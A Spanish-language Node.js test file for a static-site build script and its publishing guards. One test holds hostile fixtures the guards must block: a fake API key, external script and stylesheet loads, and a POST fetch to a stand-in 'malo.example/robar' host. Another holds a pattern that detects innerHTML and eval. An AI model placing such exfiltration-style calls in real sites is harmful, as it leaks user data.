import assert from "node:assert/strict";
import { mkdirSync, mkdtempSync, readFileSync, writeFileSync, existsSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import test from "node:test";

import { analizar } from "../scripts/guardas.mjs";
import { ensamblar, esExcluido, huellaOverlay, inyectar, urlTelemetria } from "../scripts/build.mjs";

const HTML = '<!doctype html><html><head><title>Q</title></head><body><main>hola</main></body></html>';
const DESTINO = { upstream: "https://github.com/x/y", wsUrl: "wss://live.example/ws", httpUrl: "https://live.example", hostsPermitidos: [] };

function repoFalso(extra = {}) {
  const dir = mkdtempSync(join(tmpdir(), "q-test-"));
  const archivos = { "index.html": HTML, "demo.html": HTML.replace("<main>hola</main>", "<main id=\"quadrate-live-root\"></main>"), "src/css/main.css": "body{color:#111}", "src/js/main.js": "console.log(1)",
    "README.md": "# no se publica", ".devcontainer/devcontainer.json": "{}", "docs/guia.md": "x", "src/js/a.jsx": "x", ...extra };
  for (const [ruta, contenido] of Object.entries(archivos)) {
    mkdirSync(join(dir, ruta, ".."), { recursive: true });
    writeFileSync(join(dir, ruta), contenido);
  }
  return dir;
}

test("inyectar agrega estilo y scripts una sola vez", () => {
  const una = inyectar(HTML, "abc");
  assert.equal(inyectar(una, "abc"), una);
  assert.equal((una.match(/live\.js/g) || []).length, 1);
  assert.match(una, /<link rel="stylesheet" href="\/live\/live\.css\?v=abc"><\/head>/);
  assert.match(una, /config\.js\?v=abc"><\/script><script src="\/live\/shim-ws\.js\?v=abc"><\/script><script type="module" src="\/live\/live\.js\?v=abc"><\/script><\/body>/);
  // el shim debe correr antes que los módulos de la página (clásicos primero, módulo después)
  assert.ok(una.indexOf("config.js") < una.indexOf("shim-ws.js") && una.indexOf("shim-ws.js") < una.indexOf("live.js"));
});

test("inyectar falla si la página no tiene head o body", () => {
  assert.throws(() => inyectar("<html>sin cierre", "x"), /no se puede inyectar/);
});

test("excluye lo que no es parte del sitio", () => {
  for (const ruta of [".git/config", ".devcontainer/devcontainer.json", "docs/a.html", "scripts/x.js", "README.md", "src/a.jsx", "package.json", ".upstream-commit"]) {
    assert.ok(esExcluido(ruta), ruta);
  }
  for (const ruta of ["index.html", "src/js/main.js", "src/assets/logo.webp", "src/css/main.css"]) assert.ok(!esExcluido(ruta), ruta);
});

test("ensamblar copia el repo, agrega /live y escribe el marcador", () => {
  const upstream = repoFalso();
  const salida = join(mkdtempSync(join(tmpdir(), "q-out-")), "dist");
  const r = ensamblar({ upstream, salida, destino: DESTINO, sha: "a".repeat(40) });
  assert.ok(r.ok);
  assert.ok(existsSync(join(salida, "src/js/main.js")));
  assert.ok(!existsSync(join(salida, "README.md")) && !existsSync(join(salida, ".devcontainer")) && !existsSync(join(salida, "docs")));
  assert.match(readFileSync(join(salida, "index.html"), "utf8"), /\/live\/live\.js/);
  assert.match(readFileSync(join(salida, "live/config.js"), "utf8"), /wss:\/\/live\.example\/ws/);
  const marcador = JSON.parse(readFileSync(join(salida, "upstream.json"), "utf8"));
  assert.equal(marcador.sha, "a".repeat(40));
  assert.equal(marcador.overlay, huellaOverlay({ destino: DESTINO }));
  rmSync(upstream, { recursive: true, force: true });
});

test("urlTelemetria deriva la ruta de la demo y tolera vacío", () => {
  assert.equal(urlTelemetria("wss://x.run.app/ws"), "wss://x.run.app/ws-telemetria");
  assert.equal(urlTelemetria("wss://x.run.app/ws/"), "wss://x.run.app/ws-telemetria");
  assert.equal(urlTelemetria(""), "");
});

test("la huella cambia si cambia la URL del servicio", () => {
  assert.notEqual(huellaOverlay({ destino: DESTINO }), huellaOverlay({ destino: { ...DESTINO, wsUrl: "wss://otro/ws" } }));
});

test("las guardas aceptan un sitio estático normal", () => {
  const r = analizar(repoFalso(), { excluir: esExcluido });
  assert.deepEqual(r.hallazgos, []);
});

test("las guardas bloquean secretos, recursos externos y archivos peligrosos", () => {
  const casos = {
    secreto: { "src/js/k.js": 'const k = "sk-ant-api03-ABCDEFGHIJKL";' },
    externo_script: { "index.html": HTML.replace("<main>", '<script src="https://cdn.malo.example/x.js"></script><main>') },
    externo_css: { "src/css/main.css": '@import url("https://malo.example/a.css");' },
    externo_fetch: { "src/js/main.js": 'fetch("https://malo.example/robar", {method:"POST"})' },
    externo_ws: { "src/js/main.js": 'new WebSocket("wss://malo.example/ws")' },
    peligroso: { "bin/instalar.exe": "MZ" },
  };
  for (const [nombre, extra] of Object.entries(casos)) {
    const r = analizar(repoFalso(extra), { excluir: esExcluido });
    assert.ok(!r.ok, `debió bloquear ${nombre}`);
  }
});

test("las guardas permiten hosts autorizados y enlaces normales", () => {
  const dir = repoFalso({ "index.html": HTML.replace("<main>", '<a href="https://instagram.com/q">ig</a><script src="https://ok.example/x.js"></script><main>') });
  assert.ok(!analizar(dir, { excluir: esExcluido }).ok);
  assert.ok(analizar(dir, { excluir: esExcluido, hostsPermitidos: ["ok.example"] }).ok);
});

test("las guardas bloquean un crecimiento desmedido y la falta de index.html", () => {
  const dir = repoFalso();
  const base = analizar(dir, { excluir: esExcluido });
  assert.ok(!analizar(dir, { excluir: esExcluido, bytesPrevios: Math.floor(base.bytes / 3) }).ok);
  const vacio = mkdtempSync(join(tmpdir(), "q-vacio-"));
  assert.ok(!analizar(vacio).ok);
});

test("la capa en vivo real no contiene conexiones fijas ni innerHTML con datos", () => {
  const js = readFileSync(new URL("../overlay/live.js", import.meta.url), "utf8");
  assert.ok(!/innerHTML|outerHTML|insertAdjacentHTML|eval\(|new Function/.test(js));
  assert.ok(!/(?:https?|wss?):\/\//.test(js.replace(/\/\*[\s\S]*?\*\//g, "")));
});
